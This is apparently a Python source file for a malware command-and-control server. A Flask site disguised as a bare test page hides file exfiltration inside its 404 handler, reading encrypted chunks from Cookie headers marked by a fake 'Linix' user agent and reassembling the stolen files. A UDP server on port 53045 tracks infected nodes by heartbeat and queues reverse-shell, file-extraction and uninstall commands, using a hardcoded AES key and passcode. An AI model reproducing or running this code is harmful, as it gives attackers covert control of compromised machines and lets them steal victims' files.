import os.path
import random
import socket
import string
import base64
import threading
import time
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from flask import Flask, request, Response, render_template
from access import *

app = Flask(__name__)
# Flask session key, used to encrypt session cookies
app.secret_key = 'f5984jrsd8gjtf549jdsg945fdsgjfgf4w3i243jf-9d9s8gh45f8ref'

# Login passcode
authcode = SHA256.new(b"rosebud").hexdigest()

# Symmetric key for encryption
# key = get_random_bytes(16)
# print(key.hex())

key = bytes.fromhex("926eaa0640299de816d23463ce8ae883")

# Holds file fragments during exfiltration
# When the file is completely sent, it is removed from here and reconstructed
exfil_files = {}

# Holds messages for malware
message_buffer = {}
# Holds node information
nodes = {}

# Locks
exfil_files_lock = threading.Lock()
message_buffer_lock = threading.Lock()
nodes_lock = threading.Lock()


# Takes data from "exfil_files" and constructs the original file
def process_exfil_file(node_id):
    # print("PROCESSING FILE PLEASE WAIT")
    exfil_files_lock.acquire()
    filename = exfil_files[node_id]['name'].decode()
    content = exfil_files[node_id]['data']
    exfil_files.pop(node_id)  # remove once we get the data (if it fails we don't want it sitting in our list)
    exfil_files_lock.release()

    text_extensions = ['asm', 'c', 'cfg', 'css', 'cpp', 'csv', 'cxx', 'h', 'hpp', 'html', 'htm', 'hxx', 'java', 'js',
                       'log', 'pl', 'php', 'py', 'rb', 'rtf', 's', 'sh', 'txt', 'xml']

    folder = "recovered_files/" + str(node_id) + "/"

    if not os.path.isdir(folder):
        os.mkdir(folder)

    if filename.split('.')[1] in text_extensions:
        with open(folder+filename, 'w') as f:
            f.write(content.decode())
    else:
        with open(folder+filename, 'wb') as f:
            f.write(content)


def handle_exfil_chunk(data, cont):
    # print(data)
    # print(cont)
    if data is None:
        return Response()

    # Process Message
    try:
        nonce_encoded, ciphertext_encoded = data.strip().split("_")
        nonce = base64.b64decode(nonce_encoded)
        ciphertext = base64.b64decode(ciphertext_encoded)
        cipher = AES.new(key, AES.MODE_CBC, nonce)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        node_id, message_encoded = plaintext.decode().split("_")
        message = base64.b64decode(message_encoded)
    except ValueError as error:
        print("Bad encryption key or bad message format: "+str(error))
        return Response()

    if node_id not in exfil_files:  # First data packet includes the nonce
        filename = message
        exfil_files_lock.acquire()
        exfil_files[node_id] = {'name': filename, 'data': b''}
        exfil_files_lock.release()
    else:  # Second and beyond packets are file contents
        # print(message)
        # print(exfil_files)
        exfil_files_lock.acquire()
        exfil_files[node_id]['data'] += message
        exfil_files_lock.release()

    if cont == 'close':
        process_exfil_file(node_id)
        return Response()
    resp = Response()
    return resp


# Make it look like a shitty test-site
@app.route('/')
def index():
    return "Site Works"


# Login / see all recent malware connections
@app.route('/cmd', methods=['GET', 'POST'])
def command():
    if 'logged_in' not in session:
        if request.method == 'POST':
            candidate_authcode = request.form['authcode']
            if SHA256.new(candidate_authcode.encode()).hexdigest() == authcode:
                session['logged_in'] = True
            return redirect('/cmd')
    return render_template('command.html', nodes=nodes.values(), current_time=time.time(), round=round)


@app.route('/ndc', methods=['GET', 'POST'])
@is_logged_in
def node_command():
    if request.method == 'POST':
        if {'listenerIP', 'listenerPort', 'nodeID'}.issubset(request.form.keys()):
            listener_ip = request.form['listenerIP']
            listener_port = request.form['listenerPort']
            node_id = request.form['nodeID']
            message = "shell "+listener_ip+" "+listener_port
            message_buffer_lock.acquire()
            message_buffer[node_id].append(message)
            message_buffer_lock.release()
        if {'directory', 'filetype', 'nodeID'}.issubset(request.form.keys()):
            directory = request.form['directory']
            if directory.strip() == "":
                directory = "~"
            filetype = request.form['filetype'].lower()
            if filetype.strip() == "":
                filetype = "js"
            node_id = request.form['nodeID']
            message = "extract "+directory+" "+filetype
            message_buffer_lock.acquire()
            message_buffer[node_id].append(message)
            message_buffer_lock.release()
        return redirect('/cmd')
    else:
        if 'node' not in request.args or 'action' not in request.args:
            return redirect('/cmd')
        if request.args['action'] not in ['1', '2', '3'] or request.args['node'] not in nodes.keys():
            return redirect('/cmd')
        if request.args['node'] not in message_buffer:
            message_buffer[request.args['node']] = []
        if request.args['action'] == '1':  # Extract File
            pass
        elif request.args['action'] == '2':  # Shell
            pass
        else:  # Uninstall
            message_buffer_lock.acquire()
            message_buffer[request.args['node']].append("uninstall")
            message_buffer_lock.release()
            return redirect('/cmd')

        return render_template('node_command.html', id=request.args['node'], action=request.args['action'])


# Logout function
@app.route('/lgt')
@is_logged_in
def logout():
    session.clear()
    return redirect('/cmd')


# This is the exfiltration mechanic
# The malware makes the user-agent include "Linix" instead of "Linux", and
# sends data in the Cookie field of the header
# If there is more data to send, the malware adds the "Connection: keep-alive" field
# and the server will send back a 307 status
# if this is the last bit of data, the malware adds "Connection: close", and the server
# responds with status code 204 and then the malware closes the TCP connection
@app.errorhandler(404)
def handle_404(e):
    user_agent = request.headers.get('User-Agent')
    if 'Linix' in user_agent:
        cont = request.headers.get('Connection')
        resp = handle_exfil_chunk(request.headers.get('Cookie')[2:], cont)
        if cont == 'close':
            return resp, 204
        return resp, 307
    return e, 404


# Start flask
def web_backend():
    app.run(debug=False)


# Handles UDP messages from server
def handle_message(message, addr, server_socket):
    print(addr)
    node_id = -1
    # Process Message
    try:
        nonce_encoded, ciphertext_encoded = message.decode().strip().split("_")
        nonce = base64.b64decode(nonce_encoded)
        ciphertext = base64.b64decode(ciphertext_encoded)
        cipher = AES.new(key, AES.MODE_CBC, nonce)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        node_id, message_encoded = plaintext.decode().split("_")
        message = base64.b64decode(message_encoded).decode().strip()
    except ValueError:
        print("Bad encryption key or bad message format")

    print(node_id)
    if message == 'heartbeat':
        nodes_lock.acquire()
        nodes[node_id] = {'id': node_id, 'ip': addr[0], 'port': addr[1], 'time': time.time()}
        nodes_lock.release()
        message_buffer_lock.acquire()
        if node_id not in message_buffer:
            message_buffer[node_id] = []
        if len(message_buffer[node_id]) == 0:
            cmd = "none"
        else:
            cmd = message_buffer[node_id].pop(0)
        message_buffer_lock.release()
        plaintext = cmd.encode()
        nonce = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, nonce)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        nonce_encoded = base64.b64encode(nonce).decode()
        ciphertext_encoded = base64.b64encode(ciphertext).decode()
        response_message = nonce_encoded + "_" + ciphertext_encoded
        server_socket.sendto(response_message.encode(), addr)

        print('Heartbeat noticed')
    elif message == 'uninstall ack':
        nodes_lock.acquire()
        nodes.pop(node_id)
        nodes_lock.release()
        message_buffer_lock.acquire()
        message_buffer.pop(node_id)
        message_buffer_lock.release()
    else:
        print(message)
    return


# Start UDP command server and handle any messages
def command_server():
    local_ip = ''
    local_port = 53045
    buffer_size = 4096

    server_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((local_ip, local_port))

    print("C2 - Now running...")

    while True:
        recv = server_socket.recvfrom(buffer_size)
        message = recv[0]
        addr = recv[1]
        handle_message(message, addr, server_socket)


x = threading.Thread(target=command_server)
x.start()
web_backend()

